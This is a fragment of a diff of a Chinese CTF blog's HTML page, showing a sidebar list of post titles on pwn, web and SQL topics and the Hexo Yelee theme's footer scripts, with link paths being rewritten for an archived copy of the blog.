class="post-list-item"><a class="post-list-link" href="../../../02/28/【Web 笔记】md5 绕过总结/">【Web 笔记】Md5 绕过总结</a></li><li class="post-list-item"><a class="post-list-link" href="../../../02/28/【Web 笔记】关于 SSTI 注入/">【Web 笔记】关于 SSTI 注入及绕过</a></li><li class="post-list-item"><a class="post-list-link" href="../../../02/25/【杂项】磁盘阵列知识梳理/">【杂项】磁盘阵列知识梳理</a></li><li class="post-list-item"><a class="post-list-link" href="../../../02/25/【SQL 笔记】绕过技术总结/">【SQL 笔记】绕过技术总结</a></li><li class="post-list-item"><a class="post-list-link" href="../../../02/18/【SQL 笔记】Oracle 12c 如何调用 SCOTT 用户/">【SQL 笔记】Oracle 12c 如何调用 SCOTT 用户</a></li><li class="post-list-item"><a class="post-list-link" href="../../../02/16/【WriteUp】HGAME 2020--Pwn题解/">【WriteUp】HGAME 2020--Pwn题解</a></li><li class="post-list-item"><a class="post-list-link" href="../../../02/15/【WriteUp】ACTF 2020 题解/">【WriteUp】ACTF 2020 题解</a></li><li class="post-list-item"><a class="post-list-link" href="../../../02/02/【Misc 笔记】流量分析篇/">【Misc 笔记】流量分析篇</a></li><li class="post-list-item"><a class="post-list-link" href="../../../01/24/【Pwn 笔记】Android Kernel 环境搭建/">【Pwn 笔记】Android Kernel 环境搭建</a></li><li class="post-list-item"><a class="post-list-link" href="../../../01/13/【Pwn 笔记】Linux Kernel 环境搭建/">【Pwn 笔记】Linux Kernel 环境搭建</a></li><li class="post-list-item"><a class="post-list-link" href="../../../01/13/【WriteUp】SCTF 2019--Pwn题解/">【WriteUp】SCTF 2019--Pwn题解</a></li><li class="post-list-item"><a class="post-list-link" href="../../../01/12/【WriteUp】RoarCTF 2019--Pwn题解/">【WriteUp】RoarCTF 2019--Pwn题解</a></li><li class="post-list-item"><a class="post-list-link" href="../../../01/11/【Pwn 笔记】简单记如何利用 ret2_dl_resolve/">【Pwn 笔记】简单记如何利用 Ret2_dl_resolve</a></li><li class="post-list-item"><a class="post-list-link" href="../../../01/04/【WriteUp】安恒杯元旦月赛--Pwn题解/">【WriteUp】安恒杯元旦月赛--Pwn题解</a></li><li class="post-list-item"><a class="post-list-link" href="../../../01/03/【汇编学习】mips 寄存器/">【汇编学习】Mips 寄存器</a></li><li class="post-list-item"><a class="post-list-link" href="../../../01/03/【汇编学习】mips 指令集/">【汇编学习】Mips 指令集</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2019/12/30/【WriteUp】kksctf open 2019--Pwn题解/">【WriteUp】#kksctf Open 2019--Pwn题解</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2019/12/25/【WriteUp】攻防世界--Pwn题解(Part 3)/">【WriteUp】攻防世界--Pwn题解(Part 3)</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2019/12/25/【Pwn 笔记】函数中的宏常量定义/">【Pwn 笔记】函数中的宏常量定义</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2019/12/24/【WriteUp】第三届“华为杯”XMan冬令营选拔赛题解/">【WriteUp】第三届“华为杯”XMan冬令营选拔赛题解</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2019/12/16/【Pwn 笔记】格式化字符串总结/">【Pwn 笔记】格式化字符串总结</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2019/12/13/【WriteUp】攻防世界--Pwn题解(Part 2)/">【WriteUp】攻防世界--Pwn题解(Part 2)</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2019/11/18/【WriteUp】成都大学第二届玄武杯CTF信息安全竞赛题解/">【WriteUp】成都大学第二届玄武杯CTF信息安全竞赛题解</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2019/11/05/【WriteUp】Hackme CTF--Pwn题解/">【WriteUp】Hackme CTF--Pwn题解</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2019/11/03/【学习总结】Python沙箱逃逸/">【学习总结】Python沙箱逃逸</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2019/10/28/【Docker】Docker使用教程/">【Docker】Docker使用教程</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2019/10/28/【Docker】Docker安装教程/">【Docker】Docker安装教程</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2019/10/28/【WriteUp】RSCTF 2019 题解/">【WriteUp】RSCTF 2019 题解</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2019/10/15/【Pwn 笔记】堆利用总结/">【Pwn 笔记】堆利用总结</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2019/10/14/【WriteUp】CryptixCTF'19 题解/">【WriteUp】CryptixCTF'19 题解</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2019/10/05/【WriteUp】攻防世界--Pwn题解(Part 1)/">【WriteUp】攻防世界--Pwn题解(Part 1)</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2019/10/03/【WriteUp】MOCTF--web题解/">【WriteUp】MOCTF--Web题解</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2019/10/02/【杂项】一些网站汇总/">【杂项】一些网站汇总</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2019/09/28/【WriteUp】Newark Academy CTF 2019 题解/">【WriteUp】Newark Academy CTF 2019 题解</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2019/09/24/【WriteUp】Jarvis OJ--Pwn题解/">【WriteUp】Jarvis OJ--Pwn题解</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2019/09/19/【BugkuCTF】Pwn题解/">【BugkuCTF】Pwn题解</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2019/09/11/【杂项】C语言函数总结/">【杂项】C语言函数总结</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2019/09/10/【Pwn 笔记】堆利用总结--空闲块篇/">【Pwn 笔记】堆利用总结--空闲块篇</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2019/09/09/【Hexo】让Github Pages被索引到/">【Hexo】让Github Pages被索引到</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2019/09/09/【Hexo】更改Yelee主题内部文件为自己想要的样式/">【Hexo】更改Yelee主题内部文件为自己想要的样式</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2019/09/09/【Gem】gem安装教程/">【Gem】gem安装教程</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2019/09/08/【TokyoWesterns CTF 5th 2019】Web--j2x2j/">【TokyoWesterns CTF 5th 2019】Web--J2x2j</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2019/09/08/【TokyoWesterns CTF 5th 2019】Pwn--nothing more to say/">【TokyoWesterns CTF 5th 2019】Pwn--Nothing More to Say</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2019/09/08/【TokyoWesterns CTF 5th 2019】Crypto--real-baby-rsa/">【TokyoWesterns CTF 5th 2019】Crypto--Real-Baby-Rsa</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2019/09/08/【杂项】本人的CTF writeup模板/">【杂项】本人的CTF Writeup模板</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2019/09/08/【TokyoWesterns CTF 5th 2019】Misc--Welcome!!/">【TokyoWesterns CTF 5th 2019】Misc--Welcome!!</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2019/09/08/【Hexo】安装hexo的一系列组件-Step1/">【Hexo】安装hexo的一系列组件--Step1</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2019/09/08/【Hexo】搭建博客时遇到的问题/">【Hexo】搭建博客时遇到的问题</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2019/09/07/【Npm】npm问题归总/">【Npm】npm问题汇总</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2019/09/07/【Hexo】搭建GitHub博客--Step2/">【Hexo】搭建GitHub博客--Step2</a></li></ul>
 
 
 
 
+
+
+
+
+
     <script>
+
         
+
     </script>
+
 </div>
+
       <footer id="footer">
+
     <div class="outer">
+
         <div id="footer-info">
+
             <div class="footer-left">
+
                 <i class="fa fa-copyright"></i> 
+
                 2019-2020 binLep
+
             </div>
+
             <div class="footer-right">
-                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+
+                <a href="old_blog_01/http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="old_blog_01/https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+
             </div>
+
         </div>
+
         
+
             <div class="visit">
+
                 
+
                     <span id="busuanzi_container_site_pv" style='display:none'>
+
                         <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+
                         </span>
+
                     </span>
+
                 
+
                 
+
                     <span>| </span>
+
                 
+
                 
+
                     <span id="busuanzi_container_page_pv" style='display:none'>
+
                         <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+
                         </span>
+
                     </span>
+
                 
+
             </div>
+
         
+
     </div>
+
 </footer>
+
     </div>
+
     
+
     <script src="../../../../js/GithubRepoWidget.js"></script>
 
-<script data-main="/old_blog_01/js/main.js" src="/old_blog_01//cdnjs.cloudflare.com/ajax/libs/require.js/2.2.0/require.min.js"></script>
+
+
+<script data-main="old_blog_01//js/main.js" src="//cdnjs.cloudflare.com/ajax/libs/require.js/2.2.0/require.min.js"></script>
+
+
 
     <script>
+
         $(document).ready(function() {
+
             var iPad = window.navigator.userAgent.indexOf('iPad');
+
             if (iPad > -1 || $(".left-col").css("display") === "none") {
+
                 var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+
                 var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+
                 $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+
             }
+
             else {
+
                 var backgroundnum = 5;
+
                 var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+
                 $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+
             }
+
         })
+
     </script>
+
+
+
+
+
+
 
 
 
 
 
 <div class="scroll" id="scroll">
+
     <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+
     <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
+
     <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+
 </div>
+
 <script>
+
     // Open in New Window
+
     
+
         var oOpenInNew = {
+
              github: ".github-widget a", 
+
              title: "a.article-title, .article-more-link a", 
+
              post: ".article-entry a[href], .copyright a[href]", 
+
              tags: ".article-tag a", 
+
              categories: ".article-category a, a.tag-list-link", 
+
              articleNav: "#article-nav a, #post-nav-button a", 
+
              archives: ".archive-article-title", 
+
              miniArchives: "a.post-list-link", 
+
              menu: ".header-menu a", 
+
              friends: "#js-friends a", 
+
              socail: ".social a" 
+
         }
+
         for (var x in oOpenInNew) {
+
             $(oOpenInNew[x]).attr("target", "_blank");
+
         }
+
     
+
 </script>
 
+
+
     <script>
+
         var originTitle = document.title;
+
         var titleTime;
+
         document.addEventListener("visibilitychange", function() {
+
             if (document.hidden) {
+
                 document.title = "(つェ⊂) 我藏好了哦~ " + originTitle;
+
                 clearTimeout(titleTime);
+
             }
+
             else {
+
                 document.title = "(*´∇｀*) 被你发现啦~ " + originTitle;
+
                 titleTime = setTimeout(function() {
+
                     document.title = originTitle;
+
                 }, 2000);
+
             }
+
         })
+
     </script>
 
-<script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+<script async src="old_blog_01/https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
   </div>
+
 </body>
+
 </html>
